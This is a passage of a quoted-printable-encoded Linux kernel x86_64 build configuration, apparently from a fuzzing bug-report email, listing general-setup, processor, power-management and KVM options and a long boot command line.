> CONFIG_RD_GZIP=3Dy
> CONFIG_RD_BZIP2=3Dy
> CONFIG_RD_LZMA=3Dy
> CONFIG_RD_XZ=3Dy
> CONFIG_RD_LZO=3Dy
> CONFIG_RD_LZ4=3Dy
> CONFIG_RD_ZSTD=3Dy
> # CONFIG_BOOT_CONFIG is not set
> CONFIG_CMDLINE_LOG_WRAP_IDEAL_LEN=3D1021
> CONFIG_INITRAMFS_PRESERVE_MTIME=3Dy
> CONFIG_CC_OPTIMIZE_FOR_PERFORMANCE=3Dy
> # CONFIG_CC_OPTIMIZE_FOR_SIZE is not set
> CONFIG_LD_ORPHAN_WARN=3Dy
> CONFIG_LD_ORPHAN_WARN_LEVEL=3D"warn"
> CONFIG_SYSCTL=3Dy
> CONFIG_HAVE_UID16=3Dy
> CONFIG_SYSCTL_EXCEPTION_TRACE=3Dy
> CONFIG_SYSFS_SYSCALL=3Dy
> CONFIG_HAVE_PCSPKR_PLATFORM=3Dy
> CONFIG_EXPERT=3Dy
> CONFIG_UID16=3Dy
> CONFIG_MULTIUSER=3Dy
> CONFIG_SGETMASK_SYSCALL=3Dy
> CONFIG_FHANDLE=3Dy
> CONFIG_POSIX_TIMERS=3Dy
> CONFIG_PRINTK=3Dy
> CONFIG_BUG=3Dy
> CONFIG_ELF_CORE=3Dy
> CONFIG_PCSPKR_PLATFORM=3Dy
> # CONFIG_BASE_SMALL is not set
> CONFIG_FUTEX=3Dy
> CONFIG_FUTEX_PI=3Dy
> CONFIG_FUTEX_PRIVATE_HASH=3Dy
> CONFIG_FUTEX_MPOL=3Dy
> CONFIG_EPOLL=3Dy
> CONFIG_SIGNALFD=3Dy
> CONFIG_TIMERFD=3Dy
> CONFIG_EVENTFD=3Dy
> CONFIG_SHMEM=3Dy
> CONFIG_AIO=3Dy
> CONFIG_IO_URING=3Dy
> # CONFIG_IO_URING_MOCK_FILE is not set
> CONFIG_ADVISE_SYSCALLS=3Dy
> CONFIG_MEMBARRIER=3Dy
> CONFIG_KCMP=3Dy
> CONFIG_RSEQ=3Dy
> # CONFIG_RSEQ_SLICE_EXTENSION is not set
> # CONFIG_RSEQ_STATS is not set
> # CONFIG_RSEQ_DEBUG_DEFAULT_ENABLE is not set
> CONFIG_CACHESTAT_SYSCALL=3Dy
> CONFIG_KALLSYMS=3Dy
> # CONFIG_KALLSYMS_SELFTEST is not set
> CONFIG_KALLSYMS_ALL=3Dy
> CONFIG_ARCH_HAS_MEMBARRIER_SYNC_CORE=3Dy
> CONFIG_ARCH_SUPPORTS_MSEAL_SYSTEM_MAPPINGS=3Dy
> CONFIG_HAVE_PERF_EVENTS=3Dy
> CONFIG_GUEST_PERF_EVENTS=3Dy
> CONFIG_PERF_GUEST_MEDIATED_PMU=3Dy
>=20
> #
> # Kernel Performance Events And Counters
> #
> CONFIG_PERF_EVENTS=3Dy
> # CONFIG_DEBUG_PERF_USE_VMALLOC is not set
> # end of Kernel Performance Events And Counters
>=20
> CONFIG_SYSTEM_DATA_VERIFICATION=3Dy
> CONFIG_PROFILING=3Dy
> CONFIG_TRACEPOINTS=3Dy
>=20
> #
> # Kexec and crash features
> #
> CONFIG_CRASH_RESERVE=3Dy
> CONFIG_VMCORE_INFO=3Dy
> CONFIG_KEXEC_CORE=3Dy
> CONFIG_KEXEC=3Dy
> # CONFIG_KEXEC_FILE is not set
> # CONFIG_KEXEC_JUMP is not set
> CONFIG_CRASH_DUMP=3Dy
> CONFIG_CRASH_HOTPLUG=3Dy
> CONFIG_CRASH_MAX_MEMORY_RANGES=3D8192
> # end of Kexec and crash features
>=20
> #
> # Live Update and Kexec HandOver
> #
> # CONFIG_KEXEC_HANDOVER is not set
> # end of Live Update and Kexec HandOver
> # end of General setup
>=20
> CONFIG_64BIT=3Dy
> CONFIG_X86_64=3Dy
> CONFIG_X86=3Dy
> CONFIG_INSTRUCTION_DECODER=3Dy
> CONFIG_OUTPUT_FORMAT=3D"elf64-x86-64"
> CONFIG_LOCKDEP_SUPPORT=3Dy
> CONFIG_STACKTRACE_SUPPORT=3Dy
> CONFIG_MMU=3Dy
> CONFIG_ARCH_MMAP_RND_BITS_MIN=3D28
> CONFIG_ARCH_MMAP_RND_BITS_MAX=3D32
> CONFIG_ARCH_MMAP_RND_COMPAT_BITS_MIN=3D8
> CONFIG_ARCH_MMAP_RND_COMPAT_BITS_MAX=3D16
> CONFIG_GENERIC_ISA_DMA=3Dy
> CONFIG_GENERIC_CSUM=3Dy
> CONFIG_GENERIC_BUG=3Dy
> CONFIG_GENERIC_BUG_RELATIVE_POINTERS=3Dy
> CONFIG_ARCH_MAY_HAVE_PC_FDC=3Dy
> CONFIG_GENERIC_CALIBRATE_DELAY=3Dy
> CONFIG_ARCH_HAS_CPU_RELAX=3Dy
> CONFIG_ARCH_HIBERNATION_POSSIBLE=3Dy
> CONFIG_ARCH_SUSPEND_POSSIBLE=3Dy
> CONFIG_AUDIT_ARCH=3Dy
> CONFIG_KASAN_SHADOW_OFFSET=3D0xdffffc0000000000
> CONFIG_HAVE_INTEL_TXT=3Dy
> CONFIG_ARCH_SUPPORTS_UPROBES=3Dy
> CONFIG_FIX_EARLYCON_MEM=3Dy
> CONFIG_PGTABLE_LEVELS=3D5
>=20
> #
> # Processor type and features
> #
> CONFIG_SMP=3Dy
> CONFIG_X86_X2APIC=3Dy
> # CONFIG_X86_POSTED_MSI is not set
> CONFIG_X86_MPPARSE=3Dy
> # CONFIG_X86_CPU_RESCTRL is not set
> CONFIG_X86_FRED=3Dy
> CONFIG_X86_EXTENDED_PLATFORM=3Dy
> # CONFIG_X86_NUMACHIP is not set
> # CONFIG_X86_VSMP is not set
> # CONFIG_X86_INTEL_MID is not set
> # CONFIG_X86_GOLDFISH is not set
> # CONFIG_X86_INTEL_LPSS is not set
> # CONFIG_X86_AMD_PLATFORM_DEVICE is not set
> CONFIG_IOSF_MBI=3Dy
> # CONFIG_IOSF_MBI_DEBUG is not set
> CONFIG_X86_SUPPORTS_MEMORY_FAILURE=3Dy
> CONFIG_SCHED_OMIT_FRAME_POINTER=3Dy
> CONFIG_HYPERVISOR_GUEST=3Dy
> CONFIG_PARAVIRT=3Dy
> CONFIG_PARAVIRT_SPINLOCKS=3Dy
> CONFIG_X86_HV_CALLBACK_VECTOR=3Dy
> # CONFIG_XEN is not set
> CONFIG_KVM_GUEST=3Dy
> CONFIG_ARCH_CPUIDLE_HALTPOLL=3Dy
> CONFIG_PVH=3Dy
> # CONFIG_PARAVIRT_TIME_ACCOUNTING is not set
> CONFIG_PARAVIRT_CLOCK=3Dy
> # CONFIG_JAILHOUSE_GUEST is not set
> # CONFIG_ACRN_GUEST is not set
> # CONFIG_BHYVE_GUEST is not set
> CONFIG_CC_HAS_MARCH_NATIVE=3Dy
> # CONFIG_X86_NATIVE_CPU is not set
> CONFIG_X86_INTERNODE_CACHE_SHIFT=3D6
> CONFIG_X86_L1_CACHE_SHIFT=3D6
> CONFIG_X86_TSC=3Dy
> CONFIG_X86_HAVE_PAE=3Dy
> CONFIG_X86_CX8=3Dy
> CONFIG_X86_CMOV=3Dy
> CONFIG_X86_MINIMUM_CPU_FAMILY=3D64
> CONFIG_X86_DEBUGCTLMSR=3Dy
> CONFIG_IA32_FEAT_CTL=3Dy
> CONFIG_X86_VMX_FEATURE_NAMES=3Dy
> CONFIG_PROCESSOR_SELECT=3Dy
> CONFIG_BROADCAST_TLB_FLUSH=3Dy
> CONFIG_CPU_SUP_INTEL=3Dy
> CONFIG_CPU_SUP_AMD=3Dy
> # CONFIG_CPU_SUP_HYGON is not set
> # CONFIG_CPU_SUP_CENTAUR is not set
> # CONFIG_CPU_SUP_ZHAOXIN is not set
> CONFIG_HPET_TIMER=3Dy
> CONFIG_HPET_EMULATE_RTC=3Dy
> CONFIG_DMI=3Dy
> # CONFIG_GART_IOMMU is not set
> CONFIG_BOOT_VESA_SUPPORT=3Dy
> # CONFIG_MAXSMP is not set
> CONFIG_NR_CPUS_RANGE_BEGIN=3D2
> CONFIG_NR_CPUS_RANGE_END=3D512
> CONFIG_NR_CPUS_DEFAULT=3D64
> CONFIG_NR_CPUS=3D8
> CONFIG_SCHED_MC_PRIO=3Dy
> CONFIG_X86_LOCAL_APIC=3Dy
> CONFIG_ACPI_MADT_WAKEUP=3Dy
> CONFIG_X86_IO_APIC=3Dy
> CONFIG_X86_REROUTE_FOR_BROKEN_BOOT_IRQS=3Dy
> CONFIG_X86_MCE=3Dy
> # CONFIG_X86_MCELOG_LEGACY is not set
> CONFIG_X86_MCE_INTEL=3Dy
> CONFIG_X86_MCE_AMD=3Dy
> CONFIG_X86_MCE_THRESHOLD=3Dy
> # CONFIG_X86_MCE_INJECT is not set
>=20
> #
> # Performance monitoring
> #
> CONFIG_PERF_EVENTS_INTEL_UNCORE=3Dy
> CONFIG_PERF_EVENTS_INTEL_RAPL=3Dy
> CONFIG_PERF_EVENTS_INTEL_CSTATE=3Dy
> # CONFIG_PERF_EVENTS_AMD_POWER is not set
> CONFIG_PERF_EVENTS_AMD_UNCORE=3Dy
> # CONFIG_PERF_EVENTS_AMD_BRS is not set
> # end of Performance monitoring
>=20
> CONFIG_X86_16BIT=3Dy
> CONFIG_X86_ESPFIX64=3Dy
> CONFIG_X86_VSYSCALL_EMULATION=3Dy
> CONFIG_X86_IOPL_IOPERM=3Dy
> CONFIG_MICROCODE=3Dy
> # CONFIG_MICROCODE_LATE_LOADING is not set
> # CONFIG_MICROCODE_DBG is not set
> CONFIG_X86_MSR=3Dy
> CONFIG_X86_CPUID=3Dy
> CONFIG_X86_DIRECT_GBPAGES=3Dy
> # CONFIG_X86_CPA_STATISTICS is not set
> CONFIG_NUMA=3Dy
> CONFIG_AMD_NUMA=3Dy
> CONFIG_X86_64_ACPI_NUMA=3Dy
> CONFIG_NODES_SHIFT=3D6
> CONFIG_ARCH_SPARSEMEM_ENABLE=3Dy
> CONFIG_ARCH_SPARSEMEM_DEFAULT=3Dy
> # CONFIG_ARCH_MEMORY_PROBE is not set
> CONFIG_ARCH_PROC_KCORE_TEXT=3Dy
> CONFIG_ILLEGAL_POINTER_VALUE=3D0xdead000000000000
> # CONFIG_X86_PMEM_LEGACY is not set
> # CONFIG_X86_CHECK_BIOS_CORRUPTION is not set
> CONFIG_MTRR=3Dy
> # CONFIG_MTRR_SANITIZER is not set
> CONFIG_X86_PAT=3Dy
> CONFIG_X86_UMIP=3Dy
> CONFIG_CC_HAS_IBT=3Dy
> CONFIG_X86_CET=3Dy
> CONFIG_X86_KERNEL_IBT=3Dy
> CONFIG_X86_INTEL_MEMORY_PROTECTION_KEYS=3Dy
> CONFIG_ARCH_PKEY_BITS=3D4
> # CONFIG_X86_INTEL_TSX_MODE_OFF is not set
> CONFIG_X86_INTEL_TSX_MODE_ON=3Dy
> # CONFIG_X86_INTEL_TSX_MODE_AUTO is not set
> CONFIG_X86_SGX=3Dy
> CONFIG_X86_USER_SHADOW_STACK=3Dy
> # CONFIG_INTEL_TDX_HOST is not set
> # CONFIG_EFI is not set
> CONFIG_HZ_100=3Dy
> # CONFIG_HZ_250 is not set
> # CONFIG_HZ_300 is not set
> # CONFIG_HZ_1000 is not set
> CONFIG_HZ=3D100
> CONFIG_SCHED_HRTICK=3Dy
> CONFIG_ARCH_SUPPORTS_KEXEC=3Dy
> CONFIG_ARCH_SUPPORTS_KEXEC_FILE=3Dy
> CONFIG_ARCH_SUPPORTS_KEXEC_PURGATORY=3Dy
> CONFIG_ARCH_SUPPORTS_KEXEC_SIG=3Dy
> CONFIG_ARCH_SUPPORTS_KEXEC_SIG_FORCE=3Dy
> CONFIG_ARCH_SUPPORTS_KEXEC_BZIMAGE_VERIFY_SIG=3Dy
> CONFIG_ARCH_SUPPORTS_KEXEC_JUMP=3Dy
> CONFIG_ARCH_SUPPORTS_KEXEC_HANDOVER=3Dy
> CONFIG_ARCH_SUPPORTS_CRASH_DUMP=3Dy
> CONFIG_ARCH_DEFAULT_CRASH_DUMP=3Dy
> CONFIG_ARCH_SUPPORTS_CRASH_HOTPLUG=3Dy
> CONFIG_ARCH_HAS_GENERIC_CRASHKERNEL_RESERVATION=3Dy
> CONFIG_PHYSICAL_START=3D0x1000000
> # CONFIG_RELOCATABLE is not set
> CONFIG_PHYSICAL_ALIGN=3D0x200000
> CONFIG_HOTPLUG_CPU=3Dy
> # CONFIG_COMPAT_VDSO is not set
> CONFIG_LEGACY_VSYSCALL_XONLY=3Dy
> # CONFIG_LEGACY_VSYSCALL_NONE is not set
> CONFIG_CMDLINE_BOOL=3Dy
> CONFIG_CMDLINE=3D"earlyprintk=3Dserial net.ifnames=3D0 sysctl.kernel.hung=
_task_all_cpu_backtrace=3D1 ima_policy=3Dtcb nf-conntrack-ftp.ports=3D20000=
 nf-conntrack-tftp.ports=3D20000 nf-conntrack-sip.ports=3D20000 nf-conntrac=
k-irc.ports=3D20000 nf-conntrack-sane.ports=3D20000 binder.debug_mask=3D0 r=
cupdate.rcu_expedited=3D1 rcupdate.rcu_cpu_stall_cputime=3D1 no_hash_pointe=
rs page_owner=3Don sysctl.vm.nr_hugepages=3D4 sysctl.vm.nr_overcommit_hugep=
ages=3D4 secretmem.enable=3D1 sysctl.max_rcu_stall_to_panic=3D1 msr.allow_w=
rites=3Doff coredump_filter=3D0xffff root=3D/dev/sda console=3DttyS0 vsysca=
ll=3Dnative numa=3Dfake=3D2 kvm-intel.nested=3D1 spec_store_bypass_disable=
=3Dprctl nopcid vivid.n_devs=3D64 vivid.multiplanar=3D1,2,1,2,1,2,1,2,1,2,1=
,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2,=
1,2,1,2,1,2,1,2,1,2,1,2,1,2,1,2 netrom.nr_ndevs=3D32 rose.rose_ndevs=3D32 s=
mp.csd_lock_timeout=3D100000 watchdog_thresh=3D55 workqueue.watchdog_thresh=
=3D140 sysctl.net.core.netdev_unregister_timeout_secs=3D140 dummy_hcd.num=
=3D32 max_loop=3D32 nbds_max=3D32 panic_on_warn=3D1"
> # CONFIG_CMDLINE_OVERRIDE is not set
> CONFIG_MODIFY_LDT_SYSCALL=3Dy
> # CONFIG_STRICT_SIGALTSTACK_SIZE is not set
> CONFIG_HAVE_LIVEPATCH=3Dy
> # CONFIG_LIVEPATCH is not set
> CONFIG_HAVE_KLP_BUILD=3Dy
> CONFIG_X86_BUS_LOCK_DETECT=3Dy
> # end of Processor type and features
>=20
> CONFIG_CC_HAS_NAMED_AS=3Dy
> CONFIG_CC_HAS_SLS=3Dy
> CONFIG_CC_HAS_RETURN_THUNK=3Dy
> CONFIG_CC_HAS_ENTRY_PADDING=3Dy
> CONFIG_FUNCTION_PADDING_CFI=3D11
> CONFIG_FUNCTION_PADDING_BYTES=3D16
> CONFIG_CALL_PADDING=3Dy
> CONFIG_HAVE_CALL_THUNKS=3Dy
> CONFIG_CALL_THUNKS=3Dy
> CONFIG_PREFIX_SYMBOLS=3Dy
> CONFIG_CPU_MITIGATIONS=3Dy
> CONFIG_MITIGATION_PAGE_TABLE_ISOLATION=3Dy
> CONFIG_MITIGATION_RETPOLINE=3Dy
> CONFIG_MITIGATION_RETHUNK=3Dy
> CONFIG_MITIGATION_UNRET_ENTRY=3Dy
> CONFIG_MITIGATION_CALL_DEPTH_TRACKING=3Dy
> # CONFIG_CALL_THUNKS_DEBUG is not set
> CONFIG_MITIGATION_IBPB_ENTRY=3Dy
> CONFIG_MITIGATION_IBRS_ENTRY=3Dy
> CONFIG_MITIGATION_SRSO=3Dy
> # CONFIG_MITIGATION_SLS is not set
> CONFIG_MITIGATION_GDS=3Dy
> CONFIG_MITIGATION_RFDS=3Dy
> CONFIG_MITIGATION_SPECTRE_BHI=3Dy
> CONFIG_MITIGATION_MDS=3Dy
> CONFIG_MITIGATION_TAA=3Dy
> CONFIG_MITIGATION_MMIO_STALE_DATA=3Dy
> CONFIG_MITIGATION_L1TF=3Dy
> CONFIG_MITIGATION_RETBLEED=3Dy
> CONFIG_MITIGATION_SPECTRE_V1=3Dy
> CONFIG_MITIGATION_SPECTRE_V2=3Dy
> CONFIG_MITIGATION_SRBDS=3Dy
> CONFIG_MITIGATION_SSB=3Dy
> CONFIG_MITIGATION_ITS=3Dy
> CONFIG_MITIGATION_TSA=3Dy
> CONFIG_MITIGATION_VMSCAPE=3Dy
> CONFIG_ARCH_HAS_ADD_PAGES=3Dy
>=20
> #
> # Power management and ACPI options
> #
> CONFIG_ARCH_HIBERNATION_HEADER=3Dy
> CONFIG_SUSPEND=3Dy
> CONFIG_SUSPEND_FREEZER=3Dy
> # CONFIG_SUSPEND_SKIP_SYNC is not set
> CONFIG_HIBERNATE_CALLBACKS=3Dy
> CONFIG_HIBERNATION=3Dy
> CONFIG_HIBERNATION_SNAPSHOT_DEV=3Dy
> CONFIG_HIBERNATION_COMP_LZO=3Dy
> # CONFIG_HIBERNATION_COMP_LZ4 is not set
> CONFIG_HIBERNATION_DEF_COMP=3D"lzo"
> CONFIG_PM_STD_PARTITION=3D""
> CONFIG_PM_SLEEP=3Dy
> CONFIG_PM_SLEEP_SMP=3Dy
> # CONFIG_PM_AUTOSLEEP is not set
> # CONFIG_PM_USERSPACE_AUTOSLEEP is not set
> # CONFIG_PM_WAKELOCKS is not set
> # CONFIG_PM_QOS_CPU_SYSTEM_WAKEUP is not set
> CONFIG_PM=3Dy
> CONFIG_PM_DEBUG=3Dy
> # CONFIG_PM_ADVANCED_DEBUG is not set
> # CONFIG_PM_TEST_SUSPEND is not set
> CONFIG_PM_SLEEP_DEBUG=3Dy
> # CONFIG_DPM_WATCHDOG is not set
> CONFIG_PM_TRACE=3Dy
> CONFIG_PM_TRACE_RTC=3Dy
> CONFIG_PM_CLK=3Dy
> # CONFIG_WQ_POWER_EFFICIENT_DEFAULT is not set
> # CONFIG_ENERGY_MODEL is not set
> CONFIG_ARCH_SUPPORTS_ACPI=3Dy
> CONFIG_ACPI=3Dy
> CONFIG_ACPI_LEGACY_TABLES_LOOKUP=3Dy
> CONFIG_ARCH_MIGHT_HAVE_ACPI_PDC=3Dy
> CONFIG_ACPI_SYSTEM_POWER_STATES_SUPPORT=3Dy
> CONFIG_ACPI_THERMAL_LIB=3Dy
> # CONFIG_ACPI_DEBUGGER is not set
> CONFIG_ACPI_SPCR_TABLE=3Dy
> # CONFIG_ACPI_FPDT is not set
> CONFIG_ACPI_LPIT=3Dy
> CONFIG_ACPI_SLEEP=3Dy
> CONFIG_ACPI_REV_OVERRIDE_POSSIBLE=3Dy
> CONFIG_ACPI_EC=3Dy
> # CONFIG_ACPI_EC_DEBUGFS is not set
> CONFIG_ACPI_AC=3Dy
> CONFIG_ACPI_BATTERY=3Dy
> CONFIG_ACPI_BUTTON=3Dy
> CONFIG_ACPI_VIDEO=3Dy
> CONFIG_ACPI_FAN=3Dy
> # CONFIG_ACPI_TAD is not set
> CONFIG_ACPI_DOCK=3Dy
> CONFIG_ACPI_CPU_FREQ_PSS=3Dy
> CONFIG_ACPI_PROCESSOR_CSTATE=3Dy
> CONFIG_ACPI_PROCESSOR_IDLE=3Dy
> CONFIG_ACPI_CPPC_LIB=3Dy
> CONFIG_ACPI_PROCESSOR=3Dy
> CONFIG_ACPI_HOTPLUG_CPU=3Dy
> # CONFIG_ACPI_PROCESSOR_AGGREGATOR is not set
> CONFIG_ACPI_THERMAL=3Dy
> CONFIG_ACPI_PLATFORM_PROFILE=3Dy
> CONFIG_ARCH_HAS_ACPI_TABLE_UPGRADE=3Dy
> CONFIG_ACPI_TABLE_UPGRADE=3Dy
> # CONFIG_ACPI_DEBUG is not set
> # CONFIG_ACPI_PCI_SLOT is not set
> CONFIG_ACPI_CONTAINER=3Dy
> # CONFIG_ACPI_HOTPLUG_MEMORY is not set
> CONFIG_ACPI_HOTPLUG_IOAPIC=3Dy
> # CONFIG_ACPI_SBS is not set
> # CONFIG_ACPI_HED is not set
> # CONFIG_ACPI_REDUCED_HARDWARE_ONLY is not set
> CONFIG_ACPI_NHLT=3Dy
> CONFIG_ACPI_NFIT=3Dy
> # CONFIG_NFIT_SECURITY_DEBUG is not set
> CONFIG_ACPI_NUMA=3Dy
> # CONFIG_ACPI_HMAT is not set
> CONFIG_HAVE_ACPI_APEI=3Dy
> CONFIG_HAVE_ACPI_APEI_NMI=3Dy
> # CONFIG_ACPI_APEI is not set
> # CONFIG_ACPI_DPTF is not set
> # CONFIG_ACPI_EXTLOG is not set
> # CONFIG_ACPI_CONFIGFS is not set
> # CONFIG_ACPI_PFRUT is not set
> CONFIG_ACPI_PCC=3Dy
> # CONFIG_ACPI_FFH is not set
> CONFIG_ACPI_MRRM=3Dy
> CONFIG_PMIC_OPREGION=3Dy
> CONFIG_BXT_WC_PMIC_OPREGION=3Dy
> # CONFIG_CHT_WC_PMIC_OPREGION is not set
> CONFIG_X86_PM_TIMER=3Dy
>=20
> #
> # CPU Frequency scaling
> #
> CONFIG_CPU_FREQ=3Dy
> CONFIG_CPU_FREQ_GOV_ATTR_SET=3Dy
> CONFIG_CPU_FREQ_GOV_COMMON=3Dy
> # CONFIG_CPU_FREQ_STAT is not set
> # CONFIG_CPU_FREQ_DEFAULT_GOV_PERFORMANCE is not set
> # CONFIG_CPU_FREQ_DEFAULT_GOV_POWERSAVE is not set
> CONFIG_CPU_FREQ_DEFAULT_GOV_USERSPACE=3Dy
> # CONFIG_CPU_FREQ_DEFAULT_GOV_SCHEDUTIL is not set
> CONFIG_CPU_FREQ_GOV_PERFORMANCE=3Dy
> # CONFIG_CPU_FREQ_GOV_POWERSAVE is not set
> CONFIG_CPU_FREQ_GOV_USERSPACE=3Dy
> CONFIG_CPU_FREQ_GOV_ONDEMAND=3Dy
> # CONFIG_CPU_FREQ_GOV_CONSERVATIVE is not set
> CONFIG_CPU_FREQ_GOV_SCHEDUTIL=3Dy
>=20
> #
> # CPU frequency scaling drivers
> #
> # CONFIG_CPUFREQ_DT is not set
> # CONFIG_CPUFREQ_DT_PLATDEV is not set
> CONFIG_X86_INTEL_PSTATE=3Dy
> # CONFIG_X86_PCC_CPUFREQ is not set
> CONFIG_X86_AMD_PSTATE=3Dy
> CONFIG_X86_AMD_PSTATE_DEFAULT_MODE=3D3
> # CONFIG_X86_AMD_PSTATE_UT is not set
> CONFIG_X86_ACPI_CPUFREQ=3Dy
> CONFIG_X86_ACPI_CPUFREQ_CPB=3Dy
> # CONFIG_X86_POWERNOW_K8 is not set
> # CONFIG_X86_AMD_FREQ_SENSITIVITY is not set
> # CONFIG_X86_SPEEDSTEP_CENTRINO is not set
> # CONFIG_X86_P4_CLOCKMOD is not set
>=20
> #
> # shared options
> #
> CONFIG_CPUFREQ_ARCH_CUR_FREQ=3Dy
> # end of CPU Frequency scaling
>=20
> #
> # CPU Idle
> #
> CONFIG_CPU_IDLE=3Dy
> # CONFIG_CPU_IDLE_GOV_LADDER is not set
> CONFIG_CPU_IDLE_GOV_MENU=3Dy
> # CONFIG_CPU_IDLE_GOV_TEO is not set
> CONFIG_CPU_IDLE_GOV_HALTPOLL=3Dy
> CONFIG_HALTPOLL_CPUIDLE=3Dy
> # end of CPU Idle
>=20
> CONFIG_INTEL_IDLE=3Dy
> # end of Power management and ACPI options
>=20
> #
> # Bus options (PCI etc.)
> #
> CONFIG_PCI_DIRECT=3Dy
> CONFIG_PCI_MMCONFIG=3Dy
> CONFIG_MMCONF_FAM10H=3Dy
> # CONFIG_ISA_BUS is not set
> CONFIG_ISA_DMA_API=3Dy
> CONFIG_AMD_NB=3Dy
> CONFIG_AMD_NODE=3Dy
> # end of Bus options (PCI etc.)
>=20
> #
> # Binary Emulations
> #
> CONFIG_IA32_EMULATION=3Dy
> # CONFIG_IA32_EMULATION_DEFAULT_DISABLED is not set
> CONFIG_X86_X32_ABI=3Dy
> CONFIG_COMPAT_32=3Dy
> CONFIG_COMPAT=3Dy
> CONFIG_COMPAT_FOR_U64_ALIGNMENT=3Dy
> # end of Binary Emulations
>=20
> CONFIG_KVM_COMMON=3Dy
> CONFIG_HAVE_KVM_PFNCACHE=3Dy
> CONFIG_HAVE_KVM_IRQCHIP=3Dy
> CONFIG_HAVE_KVM_IRQ_ROUTING=3Dy
> CONFIG_HAVE_KVM_DIRTY_RING=3Dy
> CONFIG_HAVE_KVM_DIRTY_RING_TSO=3Dy
> CONFIG_HAVE_KVM_DIRTY_RING_ACQ_REL=3Dy
> CONFIG_KVM_MMIO=3Dy
> CONFIG_KVM_ASYNC_PF=3Dy
> CONFIG_HAVE_KVM_MSI=3Dy
> CONFIG_HAVE_KVM_READONLY_MEM=3Dy
> CONFIG_HAVE_KVM_CPU_RELAX_INTERCEPT=3Dy
> CONFIG_KVM_VFIO=3Dy
> CONFIG_KVM_GENERIC_DIRTYLOG_READ_PROTECT=3Dy
> CONFIG_KVM_GENERIC_PRE_FAULT_MEMORY=3Dy
> CONFIG_KVM_COMPAT=3Dy
> CONFIG_HAVE_KVM_IRQ_BYPASS=3Dy
> CONFIG_HAVE_KVM_NO_POLL=3Dy
> CONFIG_VIRT_XFER_TO_GUEST_WORK=3Dy
> CONFIG_HAVE_KVM_PM_NOTIFIER=3Dy
> CONFIG_KVM_GENERIC_HARDWARE_ENABLING=3Dy
> CONFIG_KVM_ELIDE_TLB_FLUSH_IF_YOUNG=3Dy
> CONFIG_KVM_MMU_LOCKLESS_AGING=3Dy
> CONFIG_KVM_GENERIC_MEMORY_ATTRIBUTES=3Dy
> CONFIG_KVM_GUEST_MEMFD=3Dy
> CONFIG_VIRTUALIZATION=3Dy
> CONFIG_KVM_X86=3Dy
> CONFIG_KVM=3Dy
> CONFIG_KVM_SW_PROTECTED_VM=3Dy
> CONFIG_KVM_INTEL=3Dy
> # CONFIG_KVM_INTEL_PROVE_VE is not set
> CONFIG_X86_SGX_KVM=3Dy
> CONFIG_KVM_AMD=3Dy
> CONFIG_KVM_IOAPIC=3Dy
> # CONFIG_KVM_SMM is not set
> CONFIG_KVM_HYPERV=3Dy
> CONFIG_KVM_XEN=3Dy
> CONFIG_KVM_PROVE_MMU=3Dy
> CONFIG_KVM_MAX_NR_VCPUS=3D1024
> CONFIG_X86_REQUIRED_FEATURE_ALWAYS=3Dy
> CONFIG_X86_REQUIRED_FEATURE_NOPL=3Dy
> CONFIG_X86_REQUIRED_FEATURE_CX8=3Dy
> CONFIG_X86_REQUIRED_FEATURE_CMOV=3Dy
> CONFIG_X86_REQUIRED_FEATURE_CPUID=3Dy
> CONFIG_X86_REQUIRED_FEATURE_FPU=3Dy
> CONFIG_X86_REQUIRED_FEATURE_PAE=3Dy
> CONFIG_X86_REQUIRED_FEATURE_PSE=3Dy
> CONFIG_X86_REQUIRED_FEATURE_PGE=3Dy
> CONFIG_X86_REQUIRED_FEATURE_MSR=3Dy
> CONFIG_X86_REQUIRED_FEATURE_FXSR=3Dy
> CONFIG_X86_REQUIRED_FEATURE_XMM=3Dy
> CONFIG_X86_REQUIRED_FEATURE_XMM2=3Dy
> CONFIG_X86_REQUIRED_FEATURE_LM=3Dy
> CONFIG_X86_DISABLED_FEATURE_VME=3Dy
> CONFIG_X86_DISABLED_FEATURE_K6_MTRR=3Dy
> CONFIG_X86_DISABLED_FEATURE_CYRIX_ARR=3Dy
> CONFIG_X86_DISABLED_FEATURE_CENTAUR_MCR=3Dy
> CONFIG_X86_DISABLED_FEATURE_LAM=3Dy
> CONFIG_X86_DISABLED_FEATURE_XENPV=3Dy
> CONFIG_X86_DISABLED_FEATURE_TDX_GUEST=3Dy
> CONFIG_X86_DISABLED_FEATURE_SEV_SNP=3Dy
> CONFIG_AS_WRUSS=3Dy
> CONFIG_ARCH_CONFIGURES_CPU_MITIGATIONS=3Dy
>=20
> #
> # General architecture-dependent options
> #
> CONFIG_HOTPLUG_SMT=3Dy
> CONFIG_ARCH_SUPPORTS_SCHED_SMT=3Dy
> CONFIG_ARCH_SUPPORTS_SCHED_CLUSTER=3Dy
> CONFIG_ARCH_SUPPORTS_SCHED_MC=3Dy
> CONFIG_SCHED_SMT=3Dy
> CONFIG_SCHED_CLUSTER=3Dy
> CONFIG_SCHED_MC=3Dy
> CONFIG_HOTPLUG_CORE_SYNC=3Dy
> CONFIG_HOTPLUG_CORE_SYNC_DEAD=3Dy
> CONFIG_HOTPLUG_CORE_SYNC_FULL=3Dy
> CONFIG_HOTPLUG_SPLIT_STARTUP=3Dy
> CONFIG_HOTPLUG_PARALLEL=3Dy
> CONFIG_GENERIC_IRQ_ENTRY=3Dy
> CONFIG_GENERIC_SYSCALL=3Dy
> CONFIG_GENERIC_ENTRY=3Dy
> # CONFIG_KPROBES is not set
> CONFIG_JUMP_LABEL=3Dy
> # CONFIG_STATIC_KEYS_SELFTEST is not set
> # CONFIG_STATIC_CALL_SELFTEST is not set
> CONFIG_UPROBES=3Dy
> CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS=3Dy
> CONFIG_ARCH_USE_BUILTIN_BSWAP=3Dy
> CONFIG_USER_RETURN_NOTIFIER=3Dy
> CONFIG_HAVE_IOREMAP_PROT=3Dy
> CONFIG_HAVE_KPROBES=3Dy
> CONFIG_HAVE_KRETPROBES=3Dy
> CONFIG_HAVE_OPTPROBES=3Dy
> CONFIG_HAVE_KPROBES_ON_FTRACE=3Dy
> CONFIG_ARCH_CORRECT_STACKTRACE_ON_KRETPROBE=3Dy
> CONFIG_HAVE_FUNCTION_ERROR_INJECTION=3Dy
> CONFIG_HAVE_NMI=3Dy
> CONFIG_TRACE_IRQFLAGS_SUPPORT=3Dy
> CONFIG_TRACE_IRQFLAGS_NMI_SUPPORT=3Dy
> CONFIG_HAVE_ARCH_TRACEHOOK=3Dy
> CONFIG_HAVE_DMA_CONTIGUOUS=3Dy
